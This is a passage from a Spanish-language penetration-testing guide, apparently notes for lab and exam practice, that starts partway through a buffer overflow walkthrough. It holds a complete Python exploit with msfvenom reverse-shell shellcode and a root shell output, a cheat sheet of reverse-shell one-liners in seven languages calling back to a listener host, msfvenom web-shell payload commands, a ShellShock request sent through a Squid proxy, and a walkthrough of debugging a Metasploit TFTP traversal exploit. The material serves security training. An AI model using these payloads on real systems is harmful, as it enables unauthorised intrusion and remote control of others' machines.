"\x7d\x8c\x95\x1d\xfd";
```

Por Ãºltimo, considerando el tamaÃ±o de 95 bytes generados, preparamos nuestro BÃºffer:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Shellcode (95 bytes) || msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"
shellcode = ("\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19"
"\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5"
"\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2"
"\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91"
"\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce"
"\x7d\x8c\x95\x1d\xfd")

# Total bytes: 4379
crash = "\x90"*16 + shellcode + "A"*(4368-95-16) + pack('<L', 0x08134596) + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

# 95 bytes
shellcode = ("\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19"
"\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5"
"\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2"
"\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91"
"\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce"
"\x7d\x8c\x95\x1d\xfd")

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..."
	sleep(5)
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

# Ganando Acceso al Sistema

Por Ãºltimo, cerramos **edb**, corremos el programa normalmente, enviamos el bÃºffer y previamente estando en escucha desde **Netcat** por el puerto 443, ganamos acceso al sistema:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #nc -nlvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.1.81.
Ncat: Connection from 192.168.1.81:55272.
script /dev/null -c bash
Script started, file is /dev/null
root@kali:/root# whoami
whoami
root
root@kali:/root#
```

Pentesting
===============================================================================================================================

En este punto, se detallan tÃ©cnicas de Pentesting a abordar sobre las mÃ¡quinas Windows/Linux que se nos presenten.

### General

Bajo este apartado se describirÃ¡n tÃ©cnicas de enumeraciÃ³n a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.

#### Port Scanning

Cada uno tiene su forma de hacer la enumeraciÃ³n de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.

* Escaneo inicial de puertos abiertos sobre el sistema

```bash
nmap -p- --open -T5 -v -oG allPorts ipHost -n
```
* EnumeraciÃ³n del servicio y versionado para los puertos descubiertos sobre el sistema

```bash
nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted
```

La razÃ³n de hacer esto es que me parece mucho mÃ¡s Ã¡gil el poder tener una visual de los puertos abiertos de un primer tirÃ³n para el escaneo inicial, asÃ­ en lo que posteriormente lanzo el profundo de enumeraciÃ³n de servicios con los scripts bÃ¡sicos de enumeraciÃ³n, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).

* En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante

```bash
nmap -A -T4 -v ipHost -oN misc
```

Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de bÃºsqueda a fin de determinar los puertos que estÃ¡n abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciÃ©ndolo incompleto):

```bash
nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
nmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000
nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                        .
                        .
                        .
```

En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeÃ±o pero nos puede servir para tener una visual rÃ¡pida sobre los recursos alojados):

```bash
nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan
```

* VisualizaciÃ³n de categorÃ­as para los scripts de nmap

```bash
grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

Estas categorÃ­as son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorÃ­as:

```bash
nmap -p21,445 --script="vuln and safe" ipHost -oN vulnSafeScan
```

En cuanto a los **Low Hanging Fruit**, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos mÃ¡s, pero corresponden a servicios que nos pueden garantizar la ejecuciÃ³n de comandos en remoto sobre los sistemas):

```bash
nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN LHF
```

Sobre el servicio **FTP** resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexiÃ³n TCP reversa.

Sobre el servicio **ms-sql-s**, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticaciÃ³n vÃ­a **sqsh** contra el servicio proporcionando las credenciales **sa** de usuario sin contraseÃ±a. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta [mssql.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

#### Wfuzz

Aunque tambiÃ©n se puede hacer uso de **Dirbuster**, siempre he sido mÃ¡s partidiario de lidiar con **Wfuzz**. La sintaxis general para la bÃºsqueda de directorios que empleo es la siguiente:

```bash
wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ
```

En caso de querer recorrer un rango numÃ©rico, por ejemplo para un caso prÃ¡ctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.

Esta parte me recuerda sobre todo a una mÃ¡quina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la mÃ¡quina. Con el objetivo de determinar estos puertos, podemos atender a los cÃ³digos de estado del lado de la respuesta del servidor, ocultando por ejemplo el cÃ³digo de estado 404:

```bash
wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

De esta forma, se nos mostrarÃ¡ Ãºnicamente resultados donde se devuelva un cÃ³digo de estado diferente al 404.

De manera alternativa, tambiÃ©n podrÃ­amos haber aplicado lo siguiente:

```bash
wfuzz -c --sc=200 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

Para mostrar peticiones que devuelvan un 200 cÃ³mo cÃ³digo de estado. Al igual que el cÃ³digo de estado se pueden jugar con mÃ¡s parÃ¡metros de filtro, como los caracteres, el nÃºmero total de lÃ­neas, etc.

**Importante:** A la hora de obtener un **Forbidden** en el cÃ³digo de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos vÃ¡lidos vemos que estos son visibles desde la web.

Para tener un caso prÃ¡ctico, supongamos que tenemos un directorio **/design** que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeraciÃ³n de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.

Para ello, nos creamos un fichero _extensions.txt_ con el siguiente contenido:

```bash
php
txt
html
xml
cgi
```

Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:

`wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z`

De esta forma, estaremos para cada una de las lÃ­neas del payload principal comprobando las extensiones especificadas sobre el segundo payload.

#### Nikto

Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatizaciÃ³n que admiten en el examen y a veces devuelve maravillas... detallo su uso:

`nikto -h http://192.168.1.X`

#### SNMP Enumeration

Aunque se trata de un servicio que corre bajo un puerto por **UDP**, parece inofensivo pero la enumeraciÃ³n sobre dicho servicio nos puede permitir enumerar mÃ¡s de la cuenta a nivel de sistema para saber quÃ© software corren, asÃ­ como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.

Para detectar si el servicio estÃ¡ operativo:

```bash
nmap -p161 -sU --open -T5 -v -n 192.168.1.X
```

En caso de estar abierto, lo primero serÃ¡ averiguar la _Community String_. Generalmente suele ser **public**, pero por si acaso, nos montamos un ligero diccionario:

```bash
â”Œâ”€[s4vitar@parrot]â”€[~/Desktop]
â””â”€â”€â•¼ $echo -e "public\nprivate\nmanager" > community.txt
â”Œâ”€[s4vitar@parrot]â”€[~/Desktop]
â””â”€â”€â•¼ $cat community.txt 
public
private
manager
```

Una vez creado, utilizamos **onesixtyone** para bruteforcear la Community String del servicio:

```bash
onesixtyone -c community.txt -i ficheroIPS.txt
Scanning 2 hosts, 3 communities
10.11.1.X [public] Linux example 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686
10.11.1.Y [public] Linux example 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686
```

Con esto, tras ver que la Community String es **public**, consideramos los siguientes valores MIB:

```bash
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

Hay muchos mÃ¡s... pero a modo de ejemplo son los mÃ¡s significativos. Suponiendo que quisiÃ©ramos saber quÃ© procesos corre el sistema, aplicarÃ­amos el siguiente comando desde **snmpwalk**:

```bash
$~ snmpwalk -c public -v1 10.11.1.X 1.3.6.1.2.1.25.1.6.0
```

Inmediatamente, obtendremos una lista de los procesos que corren bajo el sistema.

En caso de querer aplicar un anÃ¡lisis exhaustivo sin especificaciÃ³n de valor **MIB**, aplicamos el siguiente comando:

```bash
$~ snmpwalk -c public -v1 10.11.1.X
```

Y seguidamente, se nos listarÃ¡ montÃ³n de informaciÃ³n relevante de la mÃ¡quina. Aunque parezca tonterÃ­a, hay ocasiones en las que gracias a ver la versiÃ³n de un servicio en concreto a travÃ©s del **SNMP**, he podido explotar una vulnerabilidad que jamÃ¡s habrÃ­a podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.

#### Reverse Shell

Un paso fundamental a la hora de logar **RCE** es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aquÃ­ un listado de las mÃ¡s utilizadas:

**Bash**
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

**Perl**
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Python**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby**
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Netcat**
```bash
nc -e /bin/sh 10.0.0.1 1234
```

**Netcat (Wrong Version)**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

**Java**
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

AsÃ­ mismo, podemos hacer uso de Metasploit para la creaciÃ³n de nuestros archivos maliciosos:

**PHP (Metasploit)**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

**ASP (No Metasploit)**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

**WAR (SesiÃ³n vÃ­a Netcat)**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

**JSP (SesiÃ³n vÃ­a Netcat)**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```

#### Spawning a TTY Shell

Aunque en el apartado de **Tratamiento de la TTY** en la secciÃ³n de Pentesting para Linux, detallo una tÃ©cnica para mejorar y construir una Shell totalmente interactiva, sÃ­ que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuaciÃ³n algunas de ellas:

* python -c 'import pty; pty.spawn("/bin/sh")'
* echo os.system('/bin/bash') 
* /bin/sh -i
* perl -e 'exec "/bin/sh";'
* perl: exec "/bin/sh";
* ruby: exec "/bin/sh"
* lua: os.execute('/bin/sh')
* exec "/bin/sh" (Desde IRB)
* :!bash (Desde vi)
* :set shell=/bin/bash:shell (Desde vi)
* !sh (Desde nmap)
* find /etc/passwd -exec /bin/bash \;

#### Compilado de Exploits para Windows

Desde Linux, a la hora de compilar algunos de los exploits que figuren en **Searchsploit** (generalmente en C), aplicaremos el siguiente comando:

```bash
i686-w64-mingw32-gcc exploit.c -o exploit
```

Para mÃ¡quinas Windows de 32 bits, aplicamos el siguiente comando:

```bash
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
```

#### Squid Proxy

Alguna que otra mÃ¡quina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena mÃ¡quina para practicar el concepto es la mÃ¡quina **SickOS 1.1** de VulnHub.

La idea es la siguiente, presento el reporte de un escaneo a modo de ejemplo:

```bash
TCP: 22     SSH  OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)

TCP: 3128   HTTP-Proxy  Squid http proxy 3.1.19
```

Como vemos, sÃ³lo figuran esos 2 puertos, sin embargo... el uso del _Squid_ nos puede servir para descubrir un par de puertos mÃ¡s. **Squid** no es mÃ¡s que un servidor _proxy_ para web con cachÃ©. 

Aunque orientado principalmente a HTTP y HTTPS, soporta tambiÃ©n otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:

**Proxy con cachÃ© de HTTP, FTP, y otros protocolos de internet**

Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de cachÃ© especializado en el cual almacena de forma local las pÃ¡ginas consultadas recientemente por los usuarios.

Tan interesante resulta la utilidad que hasta **Metasploit** cuenta con su propio mÃ³dulo de enumeraciÃ³n de SQUID (**auxiliary/scanner/http/squid_pivot_scanning**), desde donde podemos descubrir nuevos puertos que figuren abiertos.

Podemos configurar un escaneo desde **nikto** para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta informaciÃ³n relevante sobre el mismo:

```bash
$~ nikto -h direccionIP -useproxy http://direccionIP:puerto
```

Algo interesante es aprovechar la configuraciÃ³n de Firefox para desde la pestaÃ±a '_Network_', aÃ±adir un nuevo '_Manual proxy configuration_', el cual como campo **HTTP Proxy** disponga la IP del equipo y como puerto el que figure como servicio **Squid Proxy**. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.

Las consultas las podemos realizar tambiÃ©n desde **curl**, empleando para ello una sintaxis como la que se define a continuaciÃ³n:

```bash
$~ curl --proxy ip:puerto http://ip/cgi-bin/status # A modo de ejemplo
```

Suponiendo que la web posteriormente es vulnerable a un ataque **ShellShock**, podrÃ­amos realizar la siguiente peticiÃ³n para ejecutar comandos sobre el sistema:

```bash
curl -v --proxy ip:puerto \
  http://ip/cgi-bin/status \ 
  -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
```

Obteniendo la siguiente respuesta del lado del servidor:

```bash
*   Trying ip...
* Connected to ip (ip) port puerto (#0)
* HTTP 1.0, assume close after body
uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Closing connection 0
```

#### Metasploit Debugging

Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotaciÃ³n exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ningÃºn tipo de _Verbose_. Para lidiar con esto, existe una pequeÃ±a utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecuciÃ³n, permitiÃ©ndonos asÃ­ saber quÃ© valores estÃ¡n tomando todas las variables asÃ­ como conocer si se estÃ¡n recogiendo bien los valores que fijamos desde las opciones de configuraciÃ³n.

Otra opciÃ³n tambiÃ©n recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (Ãºtil para ver cÃ³mo viaja nuestra peticiÃ³n), y luego enruta al Host remoto.

**1. Pry-ByeBug**

Antes que nada, para evitar que nuestro Metasploit corrompa, creamos una instancia del recurso sobre el directorio **/opt**:

```bash
$~ cp -r /usr/share/metasploit-framework /opt/.
```

Una vez hecho, creamos el siguiente recurso en **~/.pryrc**:

```bash
if defined?(PryByebug)
  Pry.commands.alias_command 'c', 'continue'
  Pry.commands.alias_command 's', 'step'
  Pry.commands.alias_command 'n', 'next'
  Pry.commands.alias_command 'f', 'finish'
end

Pry::Commands.command /^$/, "repeat last command" do
  _pry_.run_command Pry.history.to_a.last
end
```

Nos resultarÃ¡ de utilidad para poder jugar con **Alias** en vez de escribir la instrucciÃ³n entera. Aplicamos el siguiente comando para instalar **pry-byebug**:

```bash
$~ gem 'pry-byebug'
```

Una vez hecho, abrimos nuestro recurso **/opt/metasploit-framework/msfconsole** con nuestro editor preferido y aÃ±adimos como requerimiento el **pry-byebug** de la siguiente forma:

```bash
#
# Standard Library
#

require 'pathname'
require 'pry-byebug' # Nueva lÃ­nea a insertar, las demÃ¡s estÃ¡n por defecto.

if ENV['METASPLOIT_FRAMEWORK_PROFILE'] == 'true'
```

Para poner un caso prÃ¡ctico, vamos a ponerlo en prÃ¡ctica con la mÃ¡quina **Dropzone** de HackTheBox. Esta mÃ¡quina se puede comprometer a travÃ©s de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.

El servicio a atacar es el **TFTP**, y el mÃ³dulo es el **exploit/windows/tftp/distinct_tftp_traversal**. Este exploit, cuenta con las siguientes configuraciones:

```bash
Module options (exploit/windows/tftp/distinct_tftp_traversal):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows
```

En este caso, podemos aplicar un **LFI** sobre el servicio, siendo la variable **DEPTH** la correspondiente al nÃºmero de veces que queremos retroceder hasta llegar a la ruta raÃ­z. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.

Â¿CÃ³mo podrÃ­amos haber sabido esto sin mirar el cÃ³digo?, **pry-byebug** serÃ¡ la respuesta a nuestros problemas.

Lo que haremos serÃ¡ generar una instancia del mÃ³dulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #searchsploit -m exploits/windows/webapps/41714.rb
  Exploit: Distinct TFTP 3.10 - Writable Directory Traversal Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/41714/
     Path: /usr/share/exploitdb/exploits/windows/webapps/41714.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /home/s4vitar/Desktop/41714.rb


â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb
```

Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razÃ³n. Una vez hecho, dado que hemos importado la utilidad **pry-byebug** en la nueva instancia de **msfconsole**, lo que nos queda es establecer un **BreakPoint** sobre el mÃ³dulo que queremos Debuggear. 

Para ello, abrimos la instancia del mÃ³dulo, y aÃ±adimos la siguiente lÃ­nea (lo harÃ© en la siguiente porciÃ³n de cÃ³digo):

```bash
  def exploit
    peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"

    # Setup the necessary files to do the wbemexec trick
    binding.pry # <-------------------------------- Nueva lÃ­nea que hemos aÃ±adido
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
```

Â¿QuÃ© consguimos con esto?, vamos a comprobarlo. Correremos el **msfconsole** desde la ruta **/opt/metasploit-framework/msfconsole**, posteriormente seleccionaremos el nuevo mÃ³dulo clonado, setearemos el **DEPTH** a 0, configuramos el resto de variables y le daremos a **run**:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/opt/metasploit-framework]
â””â”€â”€â•¼ #/opt/metasploit-framework/msfconsole -q
[*] Starting persistent handler(s)...
msf > use exploit/windows/tftp/exploit_tftp 
msf exploit(windows/tftp/exploit_tftp) > show options

Module options (exploit/windows/tftp/exploit_tftp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows


msf exploit(windows/tftp/exploit_tftp) > set DEPTH 0
DEPTH => 0
msf exploit(windows/tftp/exploit_tftp) > set RHOST 192.168.1.12
RHOST => 192.168.1.12
msf exploit(windows/tftp/exploit_tftp) > run
```

Una vez hecho, obtendremos los siguientes resultados:

```bash
msf exploit(windows/tftp/exploit_tftp) > run

[*] Started reverse TCP handler on 192.168.1.51:4444 
Found plugin pry-byebug, but could not require 'pry-byebug'
cannot load such file -- pry-byebug

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
 =>  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = "../" * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status("#{peer} - Uploading .mof...")
    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    105: end

[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
```

En este preciso instante, nos situarÃ­amos en la lÃ­nea 86 del cÃ³digo del programa, manteniendo el mismo en estado de pausa (esto es asÃ­ debido a que es en la lÃ­nea superior donde hemos fijado el Breakpoint).

Llegados a este punto, si nos fijamos, en esa misma lÃ­nea se va a almacenar un valor para la variable exe_name, Â¿podrÃ­amos ver el valor que se almacena en dicha variable?, la respuesta es sÃ­... para ello necesitamos avanzar una instrucciÃ³n en la lÃ­nea del programa para posteriormente ver su contenido. Lo harÃ­amos de la siguiente forma:

```bash
[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> n

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 87 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
 =>  87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = "../" * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status("#{peer} - Uploading .mof...")
    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    105: end

[1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> exe_name
=> "xMDsIBr.exe"
[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
```

Donde como vemos, el valor que estÃ¡ almacenando dicha variable es **xMDsIBr.exe**. De igual manera, podrÃ­amos ver como las variables **depth** y **levels** no toman el valor que deberÃ­an. Para ello, podremos establecer un Breakpoint en la lÃ­nea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.

Aplicamos los siguientes comandos:

```bash
[2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> break 96

  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 

      93:     levels = "../" * depth
    94: 
    95:     # Upload the malicious executable to C:\Windows\System32\
 => 96:     print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
    97:     upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
    98: 
    99:     # Let the TFTP server idle a bit before sending another file


[3] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> c

  Breakpoint 1. First hit

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = "../" * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
 =>  96:   print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
     97:   upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status("#{peer} - Uploading .mof...")
    104:   upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    105: end

